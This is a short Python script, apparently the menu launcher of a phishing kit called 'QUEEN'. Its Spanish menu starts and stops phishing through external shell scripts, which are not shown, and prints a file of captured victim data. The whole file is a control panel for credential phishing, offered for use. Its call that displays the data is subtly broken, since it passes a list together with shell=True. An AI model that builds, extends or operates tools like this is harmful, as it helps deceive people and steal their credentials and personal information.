#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from termcolor import colored
import subprocess

banner = """
          _____
         |A .  |  _____
         | /.\ | |A ^  |  _____
         |(_._)| | / \ | |A _  |  _____
QUEEN    |  |  | | \ / | | ( ) | |A_ _ |
         |____V| |  .  | |(_'_)| |( v )|
                 |____V| |  |  | | \ / |
                         |____V| |  .  |
                                 |____V|
"""

menu = """

1) Iniciar Phishing

2) Detener Phishing

3) Verificar información

4) Salir

"""

def main():
    print(colored(banner, "red"))
    while True:
        print(colored(menu, "blue"))
        opcion = input("Seleccione una opción: ")
        if opcion == "1":
            subprocess.run(["./start.sh"], shell=True)
        elif opcion == "2":
            subprocess.run(["./stop.sh"], shell=True)
        elif opcion == "3":
            subprocess.run(["cat", "datos.txt"], shell=True)
        elif opcion == "4":
            subprocess.run(["./stop.sh"], shell=True)
            exit()
        else:
            print(colored("COMANDO DESCONOCIDO!!"))


if __name__ == '__main__':
    main()
